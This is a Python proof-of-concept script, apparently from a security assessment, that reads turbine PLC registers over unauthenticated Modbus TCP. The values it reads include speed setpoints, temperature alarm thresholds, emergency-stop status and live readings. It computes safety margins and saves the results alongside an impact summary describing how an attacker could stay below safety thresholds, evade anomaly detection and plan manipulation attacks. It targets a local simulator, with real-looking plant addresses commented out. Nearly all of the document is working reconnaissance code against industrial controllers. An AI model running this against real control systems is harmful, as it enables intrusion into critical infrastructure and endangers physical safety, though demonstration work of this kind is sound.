#!/usr/bin/env python3
"""
Proof of concept: Unauthorised reading of turbine control parameters
This demonstrates that an attacker could read sensitive operational data
including setpoints, alarms, and safety limits from the turbine PLCs.

NOTE: This is a READ-ONLY demonstration. No values are modified.
"""

from __future__ import annotations

from pymodbus.client import ModbusTcpClient
from typing import Optional, Dict, Tuple, List, TypedDict
import json
from datetime import datetime


class TurbineConfig(TypedDict):
    speed_setpoint_rpm: Optional[int]
    temp_alarm_threshold_c: Optional[int]
    emergency_stop_active: Optional[bool]
    current_speed_rpm: Optional[int]
    current_temperature_c: Optional[int]


def read_turbine_config(plc_ip: str) -> Optional[TurbineConfig]:
    """Read turbine configuration without modifying anything"""

    client = ModbusTcpClient(plc_ip, port=502)

    if not client.connect():
        print(f"    [!] Failed to connect to {plc_ip}")
        return None

    config: TurbineConfig = {
        "speed_setpoint_rpm": None,
        "temp_alarm_threshold_c": None,
        "emergency_stop_active": None,
        "current_speed_rpm": None,
        "current_temperature_c": None,
    }

    try:
        # Speed setpoint (register 1000)
        result = client.read_holding_registers(1000, 1) # type: ignore
        if result and not result.isError():
            config["speed_setpoint_rpm"] = result.registers[0]
        else:
            print("    [!] Failed to read speed setpoint")

        # Temperature alarm threshold (register 1050)
        result = client.read_holding_registers(1050, 1) # type: ignore
        if result and not result.isError():
            config["temp_alarm_threshold_c"] = result.registers[0]
        else:
            print("    [!] Failed to read temperature threshold")

        # Emergency stop status (register 1100)
        result = client.read_holding_registers(1100, 1) # type: ignore
        if result and not result.isError():
            config["emergency_stop_active"] = bool(result.registers[0])
        else:
            print("    [!] Failed to read emergency stop status")

        # Current speed (input register 2000)
        result = client.read_input_registers(2000, 1)   # type: ignore
        if result and not result.isError():
            config["current_speed_rpm"] = result.registers[0]

        # Current temperature (input register 2050)
        result = client.read_input_registers(2050, 1)   # type: ignore
        if result and not result.isError():
            config["current_temperature_c"] = result.registers[0]

    except Exception as exc:
        print(f"    [!] Modbus error: {exc}")
        return None
    finally:
        client.close()

    return config


def demonstrate_impact() -> None:
    """Show what an attacker could learn from this access"""

    print("=" * 70)
    print("[*] Proof of Concept: Unauthorised Turbine Configuration Access")
    print("[*] This is a READ-ONLY demonstration")
    print("=" * 70 + "\n")

    turbines: List[Tuple[str, str]] = [
        ("127.0.0.1", "Turbine 1 (Demo)"),
        # ("192.168.10.11", "Turbine 2"),
        # ("192.168.10.12", "Turbine 3"),
    ]

    results: Dict[str, TurbineConfig] = {}
    successful_reads: int = 0

    for ip, name in turbines:
        print(f"[*] Reading configuration from {name} ({ip})...")
        config = read_turbine_config(ip)

        if config is None:
            print(f"    [!] Could not read from {name}\n")
            continue

        results[name] = config
        successful_reads += 1

        print(f"    Speed Setpoint: {config['speed_setpoint_rpm']} RPM")
        print(f"    Current Speed: {config['current_speed_rpm']} RPM")
        print(f"    Temperature Alarm: {config['temp_alarm_threshold_c']}°C")
        print(f"    Current Temperature: {config['current_temperature_c']}°C")
        print(f"    E-Stop Active: {config['emergency_stop_active']}")

        if (
            config["current_temperature_c"] is not None
            and config["temp_alarm_threshold_c"] is not None
        ):
            margin = (
                config["temp_alarm_threshold_c"]
                - config["current_temperature_c"]
            )
            print(f"    Temperature Safety Margin: {margin}°C")

        print()

    if successful_reads == 0:
        print("[!] No turbines were accessible. Ensure the simulator is running:")
        print("    python3 turbine_simulator.py")
        return

    output = {
        "timestamp": datetime.now().isoformat(),
        "demonstration": "read_only_turbine_access",
        "turbines_scanned": len(turbines),
        "successful_reads": successful_reads,
        "turbines": results,
        "impact_assessment": {
            "data_exposure": [
                "Operational setpoints and safety thresholds exposed",
                "Real-time operational state visible to unauthorized parties",
                "Safety margins and alarm thresholds revealed",
                "System architecture and register mapping discovered",
            ],
            "attack_enablement": [
                "Attacker could monitor operational states in real-time",
                "Configuration data reveals safety margins and operational limits",
                "Historical data collection could reveal production schedules",
                "Information enables planning of precise manipulation attacks",
                "Baseline establishment allows detection of anomalies attackers create",
            ],
            "business_impact": [
                "Intellectual property theft (operational parameters)",
                "Competitive intelligence (production efficiency)",
                "Safety information leakage enables targeted attacks",
                "Regulatory compliance violations (unauthorized access)",
            ],
        },
    }

    filename = f"poc_turbine_read_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2)  # type: ignore

    print("[*] " + "=" * 66)
    print(f"[*] Results saved to {filename}")
    print("[*] No modifications were made to any systems")
    print("[*] This demonstrates read-only reconnaissance capability")
    print("[*] " + "=" * 66)

    print("\n[*] IMPACT SUMMARY:")
    print("-" * 70)
    print("    An attacker with this access could:")
    print("    • Monitor real-time operational state")
    print("    • Map system architecture and register layout")
    print("    • Identify safety thresholds to stay below during attacks")
    print("    • Collect baseline data for anomaly detection evasion")
    print("    • Plan precisely-timed manipulation attacks")
    print("    • Steal proprietary operational parameters")


if __name__ == "__main__":
    try:
        demonstrate_impact()
    except KeyboardInterrupt:
        print("\n[*] Demonstration interrupted by user")
    except Exception as exc:
        print(f"\n[!] Error during demonstration: {exc}")
        print("[!] Ensure turbine_simulator.py is running")
